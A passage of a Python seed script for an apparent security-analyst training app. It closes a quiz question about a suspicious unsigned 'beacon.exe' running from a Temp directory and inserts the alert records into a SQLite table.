            {"id": "q1", "question": "What's the biggest red flag in this alert?",
             "options": [
                 {"text": "Process running from Temp directory + unsigned beacon.exe + SYSTEM privileges", "correct": True, "feedback": "Correct. Legitimate tools don't run from Temp, aren't unsigned, and don't create hidden directories with beacon executables."},
                 {"text": "The task name 'SystemHealthCheck' sounds suspicious", "correct": False, "feedback": "The name alone isn't definitive — many legitimate tools use similar names. The execution path and unsigned binary are the real indicators."}
             ]}
        ]),
    })

    for alert_data in alerts:
        ts = (base_time + timedelta(minutes=random.randint(0, 1440))).strftime("%Y-%m-%d %H:%M:%S")
        conn.execute(
            """INSERT INTO alerts (title, description, severity, alert_type, difficulty, status,
               source_ip, destination_ip, file_hash, cve_id,
               mitre_tactic, mitre_technique_id, mitre_technique_name,
               details, correct_verdict, correct_action, correct_explanation,
               questions, created_at, updated_at)
               VALUES (?, ?, ?, ?, ?, 'Awaiting Action', ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)""",
            (
                alert_data["title"], alert_data["description"],
                alert_data["severity"], alert_data["alert_type"],
                alert_data.get("difficulty", "Medium"),
                alert_data.get("source_ip"), alert_data.get("destination_ip"),
                alert_data.get("file_hash"), alert_data.get("cve_id"),
                alert_data.get("mitre_tactic"), alert_data.get("mitre_technique_id"),
                alert_data.get("mitre_technique_name"),
                alert_data.get("details"), alert_data.get("correct_verdict"),
                alert_data.get("correct_action"), alert_data.get("correct_explanation"),
                alert_data.get("questions"),
                ts, ts,
            ),
        )

    conn.commit()
    conn.close()
    print(f"Seeded {len(alerts)} alerts.")
